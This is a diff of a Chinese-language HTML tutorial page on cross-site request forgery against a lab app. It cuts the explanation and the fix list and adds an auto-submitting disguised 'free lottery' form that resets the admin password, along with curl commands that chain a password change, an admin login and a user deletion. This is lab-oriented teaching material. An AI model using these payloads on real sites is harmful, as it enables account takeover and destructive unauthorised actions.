@@ -2,84 +2,43 @@
 <h2>🛡️ CSRF 跨站请求伪造（Cross-Site Request Forgery）</h2>
 
 <h3>1️⃣ 什么是CSRF？</h3>
-<p>CSRF（跨站请求伪造）是一种攻击方式，攻击者诱导已登录的用户点击恶意链接或访问恶意页面，在用户不知情的情况下，以用户的身份执行非本意的操作。</p>
+<p>攻击者诱导已登录用户访问恶意页面，利用用户的登录状态，以用户身份执行非本意的操作（如修改密码）。</p>
 
-<h3>2️⃣ CSRF攻击三要素</h3>
-<table border="1" cellpadding="6" cellspacing="0" style="border-collapse:collapse;width:100%;margin:10px 0;">
-<tr style="background:#1a237e;color:white;"><th>要素</th><th>说明</th></tr>
-<tr><td>用户已登录目标站点</td><td>用户的浏览器中存有有效的Session Cookie</td></tr>
-<tr><td>目标站点存在CSRF漏洞</td><td>敏感操作仅依赖Cookie验证，无额外Token校验</td></tr>
-<tr><td>用户访问恶意页面</td><td>攻击者诱导用户点击链接或加载图片</td></tr>
-</table>
-
-<h3>3️⃣ 攻击链示例（本应用）</h3>
+<h3>2️⃣ 完整攻击链</h3>
 <pre style="background:#f5f5f5;padding:10px;border-radius:4px;overflow-x:auto;">
-Step 1: admin用户登录了用户管理系统（有有效Session Cookie）
-Step 2: 攻击者构造恶意HTML页面，发给admin
-Step 3: admin打开页面，浏览器自动发送POST请求
-Step 4: admin的密码被改为攻击者设定的值
+alice登录 → 修改admin密码 → 新密码登录admin → 删除用户carlos
+  (获得Cookie)   (CSRF+越权)     (权限提升)      (越权操作)
+</pre>
 
-恶意页面代码（csrf_attack.html）：
+<h3>3️⃣ 恶意HTML页面（Burp CSRF PoC）</h3>
+<pre style="background:#f5f5f5;padding:10px;border-radius:4px;overflow-x:auto;">
 &lt;html&gt;
 &lt;body&gt;
-&lt;h1&gt;免费抽奖！点击领取&lt;/h1&gt;
-&lt;form id="csrf" action="http://target:5000/change-password" method="POST"&gt;
-  &lt;input type="hidden" name="username" value="admin"&gt;
-  &lt;input type="hidden" name="new_password" value="hacked123"&gt;
-&lt;/form&gt;
-&lt;script&gt;document.getElementById('csrf').submit();&lt;/script&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</pre>
-
-<h3>4️⃣ 用curl模拟CSRF攻击</h3>
-<pre style="background:#f5f5f5;padding:10px;border-radius:4px;overflow-x:auto;">
-# 实验1：获得登录后的Cookie，构造恶意请求
-# 先获取有效Session
-curl -c /tmp/cookies.txt -X POST http://target:5000/login \
-  -d "username=alice&password=alice2025"
-
-# 然后利用Cookie修改admin密码（越权+CSRF）
-curl -b /tmp/cookies.txt -X POST http://target:5000/change-password \
-  -d "username=admin&new_password=evil123"
-
-# 现在可以用 admin/evil123 登录了！
-</pre>
-
-<h3>5️⃣ 实验场景一：发布恶意文章</h3>
-<pre style="background:#f5f5f5;padding:10px;border-radius:4px;overflow-x:auto;">
-# 攻击者发布含恶意链接的文章
-# 管理员点击后触发CSRF请求
-# Cookie被利用获取管理员权限
-# 实现：无账号密码登录管理员账户
-</pre>
-
-<h3>6️⃣ 实验场景二：Burp Suite生成CSRF PoC</h3>
-<pre style="background:#f5f5f5;padding:10px;border-radius:4px;overflow-x:auto;">
-Step 1: Burp Suite拦截POST /change-password请求
-Step 2: 右键 → Engagement tools → Generate CSRF PoC
-Step 3: Burp自动生成恶意HTML代码
-Step 4: 保存为HTML文件，在受害者浏览器中打开
-Step 5: 受害者的密码被无感知修改
-
-Burp生成的CSRF PoC示例：
-&lt;html&gt;
-&lt;body&gt;
+&lt;h1&gt;🎉 免费抽奖！点击领取&lt;/h1&gt;
 &lt;form action="http://target:5000/change-password" method="POST"&gt;
   &lt;input type="hidden" name="username" value="admin"&gt;
-  &lt;input type="hidden" name="new_password" value="attacker123"&gt;
-  &lt;input type="submit" value="Submit"&gt;
+  &lt;input type="hidden" name="new_password" value="hacked123"&gt;
 &lt;/form&gt;
 &lt;script&gt;document.forms[0].submit();&lt;/script&gt;
 &lt;/body&gt;
 &lt;/html&gt;
 </pre>
 
-<h3>7️⃣ 修复方案</h3>
-<ul>
-    <li><strong>✅ CSRF Token</strong> — 每个表单生成唯一Token，提交时验证</li>
-    <li><strong>✅ 验证Referer</strong> — 检查请求来源是否为本站点</li>
-    <li><strong>✅ 验证原密码</strong> — 修改密码时必须提供原密码</li>
-    <li><strong>✅ Session绑定</strong> — 禁止修改他人的密码</li>
-    <li><strong>✅ SameSite Cookie</strong> — 设置Cookie的SameSite属性为Strict</li>
-</ul>
+<h3>4️⃣ curl攻击命令</h3>
+<pre style="background:#f5f5f5;padding:10px;border-radius:4px;overflow-x:auto;">
+# Step 1: alice登录获取Cookie
+curl -c /tmp/cookies.txt -X POST http://target:5000/login \
+  -d "username=alice&password=alice2025"
+
+# Step 2: CSRF修改admin密码
+curl -b /tmp/cookies.txt -X POST http://target:5000/change-password \
+  -d "username=admin&new_password=hacked123"
+
+# Step 3: 用新密码登录admin
+curl -c /tmp/admin.txt -X POST http://target:5000/login \
+  -d "username=admin&password=hacked123"
+
+# Step 4: 越权删除用户
+curl -b /tmp/admin.txt -X POST http://target:5000/admin/delete-user \
+  -d "user_id=2"
+</pre>
